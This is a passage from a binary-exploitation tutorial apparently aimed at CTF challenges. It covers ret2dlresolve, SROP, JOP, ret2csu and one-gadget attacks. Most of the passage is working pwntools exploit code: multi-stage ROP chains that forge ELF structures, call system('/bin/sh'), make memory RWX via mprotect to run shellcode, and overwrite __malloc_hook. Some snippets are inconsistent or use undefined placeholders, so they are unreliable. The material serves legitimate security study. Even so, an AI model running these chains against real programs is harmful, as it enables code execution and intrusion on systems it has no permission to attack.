rop.ret2dlresolve(dlresolve)       # Call _dl_runtime_resolve

# Generate payload
payload = b'A' * offset
payload += rop.chain()

p.send(payload)
p.send(dlresolve.payload)
p.interactive()
```

**Manual method for more control**:

```python
class Ret2dlresolve:
    def __init__(self, elf, symbol_name, symbol_addr=None):
        self.elf = elf
        self.symbol_name = symbol_name
        
        # Get necessary addresses
        self.plt_0 = self.get_plt0()
        self.rel_plt = elf.dynamic_value_by_tag('DT_JMPREL')
        self.symtab = elf.dynamic_value_by_tag('DT_SYMTAB')
        self.strtab = elf.dynamic_value_by_tag('DT_STRTAB')
        
        # Writable memory
        self.base_addr = elf.bss(0x500)
        
    def build_structures(self):
        # Fake string
        string_addr = self.base_addr
        string_data = self.symbol_name.encode() + b'\x00'
        
        # Fake symbol
        sym_addr = self.base_addr + len(string_data) + (16 - len(string_data) % 16)
        sym_data = self.build_symbol(string_addr)
        
        # Fake relocation
        reloc_addr = sym_addr + len(sym_data) + 8
        reloc_data = self.build_relocation(sym_addr)
        
        reloc_index = (reloc_addr - self.rel_plt) // 8
        
        return {
            'data': string_data + b'\x00' * (sym_addr - string_addr - len(string_data)) + 
                    sym_data + b'\x00' * (reloc_addr - sym_addr - len(sym_data)) + 
                    reloc_data,
            'reloc_index': reloc_index,
            'data_addr': self.base_addr
        }
    
    def build_symbol(self, string_addr):
        st_name = string_addr - self.strtab
        return flat({
            0x00: st_name,
            0x04: 0x12,  # STB_GLOBAL | STT_FUNC
            0x05: 0,
            0x06: 0,
            0x08: 0,
            0x0c: 0
        }, word_size=32, filler='\x00')
    
    def build_relocation(self, sym_addr):
        sym_idx = (sym_addr - self.symtab) // 16
        r_info = (sym_idx << 8) | 0x7  # R_386_JUMP_SLOT
        
        return flat({
            0x00: self.elf.got['puts'],  # Or any writable GOT entry
            0x04: r_info
        }, word_size=32, filler='\x00')
    
    def get_plt0(self):
        plt_section = self.elf.get_section_by_name('.plt')
        return plt_section.header.sh_addr

# Usage
resolver = Ret2dlresolve(elf, 'system')
structures = resolver.build_structures()

# Build ROP chain to write and execute
# ... (write structures, call _dl_runtime_resolve)
```

### ret2dlresolve with RELRO

**Partial RELRO**: GOT is writable, attack works normally

**Full RELRO**: GOT is read-only after relocation

**Bypass for Full RELRO**:

```python
# Cannot write resolved address to GOT
# Solution 1: Use different writable location for fake relocation r_offset
# Resolver will write resolved address there instead of GOT

fake_reloc_data = flat({
    0x00: bss + 0x200,  # Writable .bss instead of GOT
    0x04: r_info
})

# After resolution, system address is at bss+0x200
# Can then call via: call [bss+0x200]

# Solution 2: Use ret2dlresolve just to resolve symbol
# Extract address from result, use in later ROP chain
```

### Advanced ret2dlresolve Techniques

#### Version-Specific Symbols

```python
# Resolve version-specific symbols (e.g., GLIBC_2.2.5)
# Need to forge version table entries as well

# Elf64_Versym structure (version table)
# Elf64_Verdef structure (version definition)

# More complex, requires additional fake structures
```

#### Chaining Multiple Resolutions

```python
# Resolve multiple functions in sequence

# Resolution 1: system
resolve_system = build_dlresolve('system')

# Resolution 2: setuid (if needed)
resolve_setuid = build_dlresolve('setuid')

# Chain them
rop.ret2dlresolve(resolve_setuid)
rop.call(setuid, [0])
rop.ret2dlresolve(resolve_system)
rop.call(system, ['/bin/sh'])
```

#### RELRO Bypass via _dl_fixup

```python
# Direct call to _dl_fixup instead of _dl_runtime_resolve
# _dl_fixup has fewer checks, may bypass some protections

# Signature: _dl_fixup(struct link_map *l, ElfW(Word) reloc_index)

# Call _dl_fixup directly with forged parameters
rop.call('_dl_fixup', [link_map_addr, fake_reloc_index])
```

### Debugging ret2dlresolve

**GDB breakpoints**:

```bash
# Break on _dl_runtime_resolve
b _dl_runtime_resolve

# Break on _dl_fixup
b _dl_fixup

# Examine relocation processing
# When hit, examine arguments:
x/10gx $rdi  # link_map structure
p $rsi       # reloc_index

# Step through resolution
ni

# Check symbol resolution
x/s *($symbol_name_address)
```

**Verify fake structures**:

```bash
# Check fake relocation
x/2gx $fake_reloc_addr
# Should show: [r_offset][r_info]

# Check fake symbol
x/3gx $fake_sym_addr
# Should show: [st_name | st_info | st_other | st_shndx][st_value][st_size]

# Check fake string
x/s $fake_string_addr
# Should show: "system" or target function name

# Verify relocation index calculation
p/x ($fake_reloc_addr - $rel_plt) / 8    # 32-bit
p/x ($fake_reloc_addr - $rela_plt) / 24  # 64-bit

# Check symbol index calculation
p/x ($fake_sym_addr - $symtab) / 16      # 32-bit
p/x ($fake_sym_addr - $symtab) / 24      # 64-bit
```

**pwndbg helpers**:

```bash
# Display dynamic section
dynamic

# Show PLT entries
plt

# Examine GOT
got

# Parse ELF structures
elf
```

### Complete ret2dlresolve Example

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

# Binary setup
binary = './vuln32'
p = process(binary)
elf = ELF(binary)
rop = ROP(elf)

# ================= Extract Dynamic Linking Info =================
plt_0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.dynamic_value_by_tag('DT_JMPREL')
symtab = elf.dynamic_value_by_tag('DT_SYMTAB')
strtab = elf.dynamic_value_by_tag('DT_STRTAB')

log.info(f"PLT[0]: {hex(plt_0)}")
log.info(f".rel.plt: {hex(rel_plt)}")
log.info(f".dynsym: {hex(symtab)}")
log.info(f".dynstr: {hex(strtab)}")

# ================= Memory Layout Planning =================
bss_base = elf.bss(0x800)

# Layout in .bss:
# +0x000: Fake string "system\x00"
# +0x010: Fake symbol entry (16 bytes aligned)
# +0x030: Fake relocation entry
# +0x050: Argument string "/bin/sh\x00"

fake_str_addr = bss_base
fake_sym_addr = bss_base + 0x10
fake_rel_addr = bss_base + 0x30
binsh_addr = bss_base + 0x50

log.info(f"Fake structures base: {hex(bss_base)}")

# ================= Build Fake Structures =================

# 1. Fake string: "system\x00"
fake_string = b"system\x00"

# 2. Fake Elf32_Sym structure
# typedef struct {
#     Elf32_Word st_name;   // Offset 0x00 (4 bytes)
#     Elf32_Addr st_value;  // Offset 0x04 (4 bytes)
#     Elf32_Word st_size;   // Offset 0x08 (4 bytes)
#     unsigned char st_info;// Offset 0x0c (1 byte)
#     unsigned char st_other;// Offset 0x0d (1 byte)
#     Elf32_Half st_shndx;  // Offset 0x0e (2 bytes)
# } Elf32_Sym;

st_name = fake_str_addr - strtab
st_info = 0x12  # STB_GLOBAL (1) | STT_FUNC (2)

fake_symbol = flat({
    0x00: st_name,
    0x04: 0,        # st_value
    0x08: 0,        # st_size
    0x0c: st_info,  # st_info
    0x0d: 0,        # st_other
    0x0e: 0         # st_shndx
}, word_size=32, filler=b'\x00')

# 3. Fake Elf32_Rel structure
# typedef struct {
#     Elf32_Addr r_offset;  // Offset 0x00 (4 bytes)
#     Elf32_Word r_info;    // Offset 0x04 (4 bytes)
# } Elf32_Rel;

sym_index = (fake_sym_addr - symtab) // 16
r_info = (sym_index << 8) | 0x7  # ELF32_R_SYM | R_386_JUMP_SLOT

# Use a writable GOT entry for r_offset
# Any GOT entry works; we'll use an unused one or overwrite puts
r_offset = elf.got['read']  # Or any other GOT entry

fake_reloc = flat({
    0x00: r_offset,
    0x04: r_info
}, word_size=32, filler=b'\x00')

# 4. Argument string
arg_string = b"/bin/sh\x00"

# Calculate relocation index for _dl_runtime_resolve
reloc_index = (fake_rel_addr - rel_plt) // 8  # Each Elf32_Rel is 8 bytes

log.info(f"Symbol index: {sym_index}")
log.info(f"Relocation index: {reloc_index}")

# ================= Find Gadgets =================

# Essential gadgets
pop_ebx = rop.find_gadget(['pop ebx', 'ret'])[0]
pop_esi_edi_ebp = rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
leave_ret = rop.find_gadget(['leave', 'ret'])[0]

log.info(f"pop ebx: {hex(pop_ebx)}")
log.info(f"pop esi; pop edi; pop ebp: {hex(pop_esi_edi_ebp)}")

# ================= Build Stage 1: Write Fake Structures =================

# Use read() to write fake structures to .bss
# read(0, bss_base, 0x100)

offset = 112  # Buffer overflow offset (adjust based on binary)

stage1 = b'A' * offset

# Call read(0, bss_base, 0x100)
# Calling convention: args on stack for 32-bit
stage1 += p32(elf.plt['read'])
stage1 += p32(pop_esi_edi_ebp)  # Return address (cleanup)
stage1 += p32(0)                # fd = stdin
stage1 += p32(bss_base)         # buf = .bss
stage1 += p32(0x100)            # count = 256

# ================= Build Stage 2: Call _dl_runtime_resolve =================

# After read() completes, we need to:
# 1. Push argument to system ("/bin/sh" address)
# 2. Push reloc_index
# 3. Push link_map (from GOT[1])
# 4. Jump to _dl_runtime_resolve

# Standard _dl_runtime_resolve calling convention (32-bit):
# Stack layout:
# [link_map]      <- pushed by PLT[0]
# [reloc_index]   <- pushed by PLT stub
# [return_addr]   <- return address after resolution
# [arg1]          <- first argument to resolved function

# We'll construct this manually

# After pop esi; pop edi; pop ebp from read() cleanup:
stage1 += p32(0)  # esi (junk)
stage1 += p32(0)  # edi (junk)
stage1 += p32(0)  # ebp (junk)

# Now manually build stack for _dl_runtime_resolve
# We need to push in reverse order:
stage1 += p32(plt_0 + 6)        # Jump to _dl_runtime_resolve (skip first push)
stage1 += p32(reloc_index)      # reloc_index argument
stage1 += p32(0xdeadbeef)       # Fake return address (won't be reached)
stage1 += p32(binsh_addr)       # Argument to system()

# ================= Send Stage 1 =================
log.info("Sending stage 1 payload...")
p.send(stage1)

# ================= Send Stage 2: Fake Structures =================

stage2 = fake_string.ljust(0x10, b'\x00')
stage2 += fake_symbol.ljust(0x20, b'\x00')
stage2 += fake_reloc.ljust(0x20, b'\x00')
stage2 += arg_string

log.info("Sending fake structures...")
p.send(stage2.ljust(0x100, b'\x00'))

# ================= Interact =================
log.success("Exploitation complete, dropping to shell...")
p.interactive()
```

### Alternative ret2dlresolve: Ret2dl_resolve_data

**Simpler approach**: Use existing `.dynamic` section entries, only forge string.

```python
# Instead of forging all structures, reuse existing ones
# Only add new string to .dynstr

# Find unused symbol table entry
unused_sym_idx = find_unused_symbol(elf)

# Calculate where to write new string
# Append after existing .dynstr section
dynstr_end = strtab + elf.get_section_by_name('.dynstr').data_size

# Write "system\x00" to dynstr_end
new_string_offset = dynstr_end - strtab

# Modify existing symbol entry st_name field to point to our string
# (if we can write to symbol table)

# Or forge minimal structures with correct offsets
```

### ret2dlresolve Variations

#### Ret2csu + dlresolve

Combine `__libc_csu_init` gadgets with dlresolve for better register control:

```python
# Use csu gadgets to set up arguments
csu_gadget1 = csu_init + 90  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
csu_gadget2 = csu_init + 64  # mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]

# Set up for write() call to write fake structures
payload = p64(csu_gadget1)
payload += p64(0)              # rbx
payload += p64(1)              # rbp
payload += p64(elf.got['read']) # r12 (function pointer)
payload += p64(0x100)          # r13 (rdx - count)
payload += p64(bss_base)       # r14 (rsi - buf)
payload += p64(0)              # r15 (edi - fd)
payload += p64(csu_gadget2)

# After write completes, continue with dlresolve
payload += p64(0) * 7  # Cleanup pops

# Jump to dlresolve machinery
# ... (setup reloc_index, call _dl_runtime_resolve)
```

#### BROP + dlresolve

Blind ROP combined with dlresolve for remote exploitation without binary:

```python
# 1. BROP phase: Find gadgets blindly
# 2. Leak binary addresses
# 3. Parse ELF headers remotely
# 4. Extract dynamic linking info
# 5. Build ret2dlresolve payload

# Example: Leak .dynamic section
def leak_dynamic():
    # Find .dynamic section via brute force
    # Parse DT_JMPREL, DT_SYMTAB, DT_STRTAB entries
    pass

# Then use standard ret2dlresolve technique
```

### Protection Mechanisms and Bypasses

**RELRO (Full)**:

- GOT is read-only
- Bypass: Write resolved address to different writable location
- Use resolved address indirectly

**PIE + ASLR**:

- Need information leak to find base addresses
- Can use partial overwrite if close addresses
- Combine with format string leak

**Seccomp**:

- May block dangerous syscalls
- ret2dlresolve can call any libc function, not just syscalls
- Useful for calling functions like `mprotect`, `open`, `sendfile`

**Stack Canaries**:

- ret2dlresolve doesn't help directly with canaries
- Combine with canary leak or other bypass

### When to Use Each Technique

**ret2dlresolve**:

- ✓ No libc leak available
- ✓ Limited ROP gadgets
- ✓ Need to call function not in PLT
- ✓ Partial RELRO (writable GOT)
- ✗ Full RELRO (requires workaround)
- ✗ Very small buffer (structures take space)

**SROP**:

- ✓ Minimal gadgets (just syscall)
- ✓ Need arbitrary register control
- ✓ Known writable memory
- ✗ No syscall gadget available
- ✗ Seccomp blocks sigreturn

**JOP**:

- ✓ Stack corruption detected/mitigated
- ✓ Indirect jump gadgets available
- ✓ Controlled memory for dispatch table
- ✗ Limited gadgets
- ✗ Simple ROP works fine

**Advanced ROP**:

- ✓ Good gadget availability
- ✓ Need complex computation
- ✓ Multiple stages required
- ✗ Very limited gadgets (use SROP/JOP)

## Combining Techniques

### SROP + ret2dlresolve

```python
# Use SROP to set up environment for ret2dlresolve

# Frame 1: Write fake structures via read()
frame1 = SigreturnFrame()
frame1.rax = 0                    # sys_read
frame1.rdi = 0
frame1.rsi = bss_base
frame1.rdx = 0x200
frame1.rip = syscall
frame1.rsp = bss_base + 0x100

# Frame 2: Call _dl_runtime_resolve
frame2 = SigreturnFrame()
frame2.rax = reloc_index
frame2.rdi = link_map             # Set up arguments
frame2.rip = dl_runtime_resolve
frame2.rsp = bss_base + 0x200

# Chain them together
payload = trigger_srop(frame1)
# Send fake structures during read()
payload += trigger_srop(frame2)
```

### ROP + JOP Hybrid

```python
# Use ROP to set up registers, transition to JOP for execution

# ROP stage: Leak addresses, write dispatch table
rop_chain = build_rop_leak()
rop_chain += write_dispatch_table()

# Transition to JOP
rop_chain += p64(pop_rsi)
rop_chain += p64(dispatch_table_addr)
rop_chain += p64(pop_rbx)
rop_chain += p64(dispatch_table_addr + 8)
rop_chain += p64(jop_dispatcher)

# JOP takes over from here
```

### Multi-Stage Exploitation

**Complete exploitation example** combining multiple techniques:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# ================= Stage 1: Information Leak (Format String) =================
p = process('./vuln')
elf = ELF('./vuln')

# Leak stack and libc addresses via format string
p.sendlineafter(b'Name: ', b'%3$p.%15$p')
p.recvuntil(b'Hello, ')
leaks = p.recvline().strip().split(b'.')
stack_leak = int(leaks[0], 16)
libc_leak = int(leaks[1], 16)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = libc_leak - libc.symbols['__libc_start_main'] - 231

log.success(f"Stack leak: {hex(stack_leak)}")
log.success(f"Libc base: {hex(libc.address)}")

# ================= Stage 2: Stack Pivot (ROP) =================
# Small buffer overflow, pivot stack to larger region

# Write ROP chain to .bss
bss_rop_addr = elf.bss(0x800)

rop = ROP([elf, libc])
rop.read(0, bss_rop_addr, 0x400)  # Read main ROP chain
rop.raw(pop_rsp)
rop.raw(bss_rop_addr)              # Pivot to .bss

payload1 = b'A' * 0x108
payload1 += rop.chain()

p.sendlineafter(b'Data: ', payload1)

# ================= Stage 3: Main Exploitation (SROP + dlresolve) =================

# Build comprehensive chain in .bss

# SROP frame 1: Make memory executable
mprotect_frame = SigreturnFrame()
mprotect_frame.rax = 10                           # sys_mprotect
mprotect_frame.rdi = (bss_rop_addr & ~0xfff)     # addr (page-aligned)
mprotect_frame.rsi = 0x2000                       # len
mprotect_frame.rdx = 7                            # prot = RWX
mprotect_frame.rip = libc.symbols['syscall']
mprotect_frame.rsp = bss_rop_addr + 0x200

# SROP frame 2: Read shellcode
read_frame = SigreturnFrame()
read_frame.rax = 0                                # sys_read
read_frame.rdi = 0
read_frame.rsi = bss_rop_addr + 0x400
read_frame.rdx = 0x100
read_frame.rip = libc.symbols['syscall']
read_frame.rsp = bss_rop_addr + 0x400             # Jump to shellcode

main_chain = b''
main_chain += p64(libc.symbols['syscall'])
main_chain += bytes(mprotect_frame)
main_chain += p64(libc.symbols['syscall'])
main_chain += bytes(read_frame)

p.send(main_chain.ljust(0x400, b'\x00'))

# ================= Stage 4: Execute Shellcode =================

shellcode = asm(shellcraft.amd64.linux.sh())
p.send(shellcode)

log.success("Shell spawned!")
p.interactive()
```

## Debugging Advanced Techniques

### GDB Scripts for Complex Exploitation

**Auto-trace ROP chains**:

```python
# gdb_trace_rop.py
import gdb

class TraceROP(gdb.Command):
    def __init__(self):
        super(TraceROP, self).__init__("trace-rop", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        while True:
            # Get current instruction
            frame = gdb.newest_frame()
            pc = frame.pc()
            
            # Disassemble
            insn = gdb.execute(f"x/i {pc}", to_string=True)
            print(f"[{hex(pc)}] {insn}")
            
            # Check for ret
            if 'ret' in insn.lower():
                rsp = int(gdb.parse_and_eval('$rsp'))
                ret_addr = int(gdb.parse_and_eval(f'*(unsigned long*){rsp}'))
                print(f"  -> Returning to: {hex(ret_addr)}")
            
            # Step
            gdb.execute('stepi', to_string=True)

TraceROP()
```

**Monitor register changes**:

```bash
# In GDB
define hook-stop
    info registers rdi rsi rdx rcx r8 r9 rax
    x/5i $rip
    x/10gx $rsp
end
```

### Common Pitfalls and Solutions

**Issue: Gadget not found**

```python
# Solution: Search in linked libraries
libc_rop = ROP(libc)
gadget = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
```

**Issue: Stack alignment**

```python
# x86-64 requires 16-byte alignment before call
# Solution: Add extra ret gadget
payload += p64(ret_gadget)  # Alignment
payload += p64(target_function)
```

**Issue: Null bytes in addresses**

```python
# Solution 1: Use different memory regions
# Solution 2: Encode addresses (if possible)
# Solution 3: Use partial overwrites
```

**Issue: SROP frame constraints**

```python
# Solution: Verify constraints with one_gadget
# Check register requirements
# Use multiple SROP frames to set up state
```

This comprehensive guide to advanced exploitation techniques provides the foundation for tackling complex CTF challenges involving ROP, JOP, SROP, and ret2dlresolve. Each technique has specific use cases and can be combined for maximum effectiveness against modern protections.

---

## ret2csu Technique

### Overview

**ret2csu:** Exploit `__libc_csu_init` function present in dynamically linked binaries for controlled register manipulation

**Problem solved:** Setting multiple registers (RDX, RSI, RDI) when limited gadgets available

**Why it works:**

- `__libc_csu_init` contains universal gadgets in nearly all dynamically linked binaries
- Provides register control without external gadgets
- Present even when binary is stripped

### __libc_csu_init Function Structure

**Assembly code (typical x64 binary):**

```assembly
; __libc_csu_init function contains two useful gadget sequences

; Gadget 1 (csu_pop) - typically at offset +0x5a from function start
0x40061a <__libc_csu_init+90>:
  pop    rbx
  pop    rbp
  pop    r12
  pop    r13
  pop    r14
  pop    r15
  ret

; Gadget 2 (csu_call) - typically at offset +0x40 from function start  
0x400600 <__libc_csu_init+64>:
  mov    rdx, r15     ; RDX = R15
  mov    rsi, r14     ; RSI = R14
  mov    edi, r13d    ; EDI = R13D (RDI lower 32 bits)
  call   qword ptr [r12+rbx*8]  ; Call function pointer
  add    rbx, 1
  cmp    rbx, rbp
  jne    0x400600     ; Loop if RBX != RBP
  ; ... continues to csu_pop gadget
```

**Gadget flow visualization:**

```
Stack Layout          Register State
┌────────────────┐
│ csu_pop addr   │ ← Return here first
├────────────────┤
│ 0 (RBX)        │ ← Pop into RBX (loop counter)
├────────────────┤
│ 1 (RBP)        │ ← Pop into RBP (loop limit)
├────────────────┤
│ func_ptr (R12) │ ← Pop into R12 (function to call)
├────────────────┤
│ arg1 (R13)     │ ← Pop into R13 → RDI
├────────────────┤
│ arg2 (R14)     │ ← Pop into R14 → RSI
├────────────────┤
│ arg3 (R15)     │ ← Pop into R15 → RDX
├────────────────┤
│ csu_call addr  │ ← Return to csu_call
├────────────────┤
│ junk * 7       │ ← Add/pop sequence consumes 7 qwords
├────────────────┤
│ next_gadget    │ ← Continue ROP chain
└────────────────┘
```

### Finding ret2csu Gadgets

**Manual search in GDB:**

```gdb
# Disassemble __libc_csu_init
disassemble __libc_csu_init

# Find pop sequence (csu_pop)
x/20i __libc_csu_init+80

# Find mov sequence (csu_call)
x/20i __libc_csu_init+60
```

**Using objdump:**

```bash
objdump -d binary | grep -A20 "<__libc_csu_init>"

# Look for:
# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
```

**Using pwntools:**

```python
from pwn import *

elf = ELF('./binary')

# Find csu_init function
csu_init = elf.symbols['__libc_csu_init']

# Typical offsets (verify with disassembly)
csu_pop = csu_init + 0x5a   # pop rbx; pop rbp; ... ret
csu_call = csu_init + 0x40  # mov rdx, r15; mov rsi, r14; ...

log.info(f"csu_pop: {hex(csu_pop)}")
log.info(f"csu_call: {hex(csu_call)}")
```

### Basic ret2csu Exploitation

**Scenario:** Call function with 3 arguments (e.g., `write(1, buffer, length)`)

**Step 1: Identify target function pointer location**

```python
# Need a valid function pointer we can call via [r12+rbx*8]
# Options:
# 1. .init_array section (contains function pointers)
# 2. .fini_array section
# 3. GOT entries (if we want to call libc functions)

# Example: Use .init_array
init_array = elf.get_section_by_name('.init_array').header['sh_addr']
```

**Step 2: Build ret2csu chain**

```python
from pwn import *

context.binary = elf = ELF('./binary')

# Gadget addresses
csu_pop = 0x40061a   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x400600  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]

# Function pointers location (e.g., .fini_array or .init_array)
fini_array = elf.get_section_by_name('.fini_array').header['sh_addr']

# Target: write(1, buffer_addr, length)
buffer_addr = 0x601000  # Some readable memory
length = 0x100

# Build ROP chain
payload = b'A' * offset  # Overflow to return address

# Part 1: Set up registers via csu_pop
payload += p64(csu_pop)
payload += p64(0)              # RBX = 0 (for [r12+rbx*8] = [r12+0])
payload += p64(1)              # RBP = 1 (loop exits when RBX+1 == RBP)
payload += p64(fini_array)     # R12 = function pointer location
payload += p64(1)              # R13 = 1 (becomes RDI/arg1)
payload += p64(buffer_addr)    # R14 = buffer_addr (becomes RSI/arg2)
payload += p64(length)         # R15 = length (becomes RDX/arg3)

# Part 2: Execute csu_call
payload += p64(csu_call)

# Part 3: Clean up after call
payload += b'A' * 56          # Skip add rbx,1; cmp; jne; pop*6

# Part 4: Continue ROP chain
payload += p64(next_gadget)
```

**Step 3: Verify register setup**

```gdb
# Break at call instruction in csu_call
b *0x400608

# Run with payload
run < payload.txt

# Verify registers
info registers
# RDI should = 1
# RSI should = buffer_addr
# RDX should = length
```

### Advanced ret2csu: Calling Arbitrary Functions

**Problem:** `call [r12+rbx*8]` requires function pointer at specific location

**Solution 1: Use GOT entries**

```python
# GOT contains pointers to libc functions
# After first call, GOT is populated with actual addresses

# Example: Call read(0, buffer, size) via read@GOT
read_got = elf.got['read']

payload += p64(csu_pop)
payload += p64(0)              # RBX = 0
payload += p64(1)              # RBP = 1
payload += p64(read_got)       # R12 = &read@GOT
payload += p64(0)              # R13 = 0 (stdin)
payload += p64(buffer_addr)    # R14 = buffer
payload += p64(0x100)          # R15 = size
payload += p64(csu_call)
payload += b'A' * 56
```

**Solution 2: Write function pointer using partial overflow**

```python
# If we have partial write primitive:
# 1. Use first ROP chain to write function pointer to known location
# 2. Use ret2csu to call via that pointer

# First chain: write system address to .bss
payload += p64(pop_rdi) + p64(system_addr)
payload += p64(pop_rsi) + p64(bss_addr)
payload += p64(mov_ptr_rsi_rdi)  # [rsi] = rdi (write system to bss)

# Second chain: call via bss using ret2csu
payload += p64(csu_pop)
payload += p64(0) + p64(1)
payload += p64(bss_addr)        # R12 points to system address
payload += p64(bin_sh_addr)     # R13 = "/bin/sh"
payload += p64(0) + p64(0)
payload += p64(csu_call)
```

### ret2csu for Complex Register Setup

**Scenario:** Need to call `mprotect(addr, size, PROT_READ|PROT_WRITE|PROT_EXEC)`

**Parameters:**

- RDI = address (page-aligned)
- RSI = size
- RDX = protection flags (7 for RWX)

```python
# Make stack executable via mprotect
stack_page = stack_addr & ~0xfff  # Page-align
page_size = 0x1000
rwx_flags = 7  # PROT_READ|PROT_WRITE|PROT_EXEC

# ret2csu chain
payload += p64(csu_pop)
payload += p64(0) + p64(1)
payload += p64(mprotect_got)     # Call mprotect
payload += p64(stack_page)       # RDI
payload += p64(page_size)        # RSI
payload += p64(rwx_flags)        # RDX
payload += p64(csu_call)
payload += b'A' * 56

# After mprotect succeeds, stack is executable
# Jump to shellcode on stack
payload += p64(shellcode_addr)
```

### ret2csu Limitations and Workarounds

**Limitation 1: RDI only gets lower 32 bits (EDI)**

```assembly
mov    edi, r13d  ; Only sets lower 32 bits of RDI
```

**Workaround:** Use when addresses fit in 32 bits, or combine with other gadgets

```python
# If need full 64-bit RDI, use separate pop rdi gadget first
payload += p64(pop_rdi) + p64(full_64bit_addr)
payload += p64(target_func)

# Or use ret2csu only for RSI/RDX
```

**Limitation 2: Consumes many stack bytes (7 pops + cleanup)**

```python
# Each ret2csu iteration uses ~104 bytes
# Limited by stack size or overflow length
```

**Limitation 3: Function pointer indirection**

```assembly
call   qword ptr [r12+rbx*8]  ; Indirect call
```

**Workaround:** Use GOT, writable sections, or plant pointer first

### ret2csu in Multi-Stage Exploits

**Stage 1: Use ret2csu to leak libc**

```python
# Call write(1, got_entry, 8) to leak libc address
payload = b'A' * offset
payload += p64(csu_pop)
payload += p64(0) + p64(1)
payload += p64(write_got)       # Call write via GOT
payload += p64(1)               # stdout
payload += p64(puts_got)        # Leak puts address
payload += p64(8)               # Size
payload += p64(csu_call)
payload += b'A' * 56
payload += p64(main)            # Return to main for stage 2

p.sendline(payload)
leaked_puts = u64(p.recv(8))
libc.address = leaked_puts - libc.symbols['puts']
```

**Stage 2: Use ret2csu with leaked addresses**

```python
# Now call system("/bin/sh")
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p64(csu_pop)
payload += p64(0) + p64(1)
payload += p64(controlled_ptr)  # Location containing system addr
payload += p64(bin_sh)
payload += p64(0) + p64(0)
payload += p64(csu_call)

p.sendline(payload)
p.interactive()
```

---

## One-Gadget Exploitation

### One-Gadget Concept

**One-gadget:** Single instruction sequence in libc that spawns shell with minimal constraints

**Advantages:**

- Single address to overwrite (hooks, return addresses)
- No ROP chain needed
- Bypasses stack alignment issues sometimes
- Faster exploitation

**Typical one-gadget code:**

```assembly
; Example one-gadget in libc
0x4f3d5: 
  mov    rax, qword ptr [rip + 0x3945e4]
  lea    rdi, [rip + 0x163e94]    ; "/bin/sh"
  lea    rsi, [rsp + 0x70]
  mov    rdx, qword ptr [rax]
  mov    rax, qword ptr [rax + 8]
  test   rax, rax
  je     0x4f3f0
  call   rax                       ; execve("/bin/sh", ...)
```

### Finding One-Gadgets

**Using one_gadget tool:**

```bash
# Install
gem install one_gadget

# Find one-gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Example output:
# 0x4f3d5 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
#
# 0x4f432 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
#
# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
```

**Manual search:**

```bash
# Search for execve calls in libc
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B10 "call.*execve"

# Look for patterns:
# - Load "/bin/sh" address
# - Call execve or similar
# - Minimal register setup
```

**Using ROPgadget:**

```bash
ROPgadget --binary libc.so.6 --string "/bin/sh"
# Find address of "/bin/sh" string

ROPgadget --binary libc.so.6 | grep "execve"
# Find execve syscall or call
```

### Understanding One-Gadget Constraints

**Common constraints:**

**1. Register constraints:**

```
[rsp+0x70] == NULL       # Stack value must be NULL
rax == NULL              # Register must be NULL
[rdi] == NULL            # Pointer target must be NULL
```

**2. Environment constraints:**

```
environ == NULL          # Environment pointer NULL
[environ] == NULL        # First env var NULL
```

**3. Stack alignment:**

```
rsp & 0xf == 0           # Stack 16-byte aligned
```

**Checking constraints in GDB:**

```gdb
# Break at target (e.g., malloc_hook call site)
b *main+123

# Execute until one-gadget would execute
run

# Check constraints
x/gx $rsp+0x70          # Should be 0x0 if constraint is [rsp+0x70] == NULL
print $rax              # Should be 0 if constraint is rax == NULL
x/10gx environ          # Check environment

# Try each one-gadget until constraints satisfied
```

### Basic One-Gadget Exploitation

**Scenario:** Overwrite `__malloc_hook` with one-gadget

**Step 1: Leak libc address**

```python
from pwn import *

# Leak libc (via GOT, format string, unsorted bin, etc.)
libc_leak = leak_libc_address()
libc.address = libc_leak - libc_symbol_offset

log.info(f"Libc base: {hex(libc.address)}")
```

**Step 2: Find one-gadget**

```python
# Use one_gadget tool output
one_gadget_offsets = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadgets = [libc.address + offset for offset in one_gadget_offsets]

log.info(f"One-gadgets: {[hex(g) for g in one_gadgets]}")
```

**Step 3: Overwrite hook**

```python
# Overwrite __malloc_hook via tcache/fastbin attack
malloc_hook = libc.symbols['__malloc_hook']

# Fastbin/tcache corruption to allocate at malloc_hook
# (See Heap Exploitation section for technique)
fake_chunk = malloc_hook - 0x23  # Adjust for size field

# ... fastbin/tcache corruption ...

# Write one-gadget to __malloc_hook
chunk = malloc(0x60)  # Gets malloc_hook location
write(chunk, b'A' * offset + p64(one_gadgets[0]))
```

**Step 4: Trigger malloc**

```python
# Next malloc call triggers hook
malloc(1)  # Calls __malloc_hook → one_gadget → shell!
p.interactive()
```

### Satisfying One-Gadget Constraints

**Technique 1: Stack grooming**

```python
# If constraint: [rsp+0x70] == NULL
# Manipulate stack before trigger

# Example: Call chain that zeros stack
payload = p64(pop_rax) + p64(0)    # RAX = 0
payload += p64(push_rax)           # Push 0 onto stack
# ... repeat to zero stack region ...
payload += p64(one_gadget)
```

**Technique 2: Try all one-gadgets**

```python
# Different call sites may satisfy different constraints
for i, gadget in enumerate(one_gadgets):
    log.info(f"Trying one-gadget {i}: {hex(gadget)}")
    
    # Reset program state
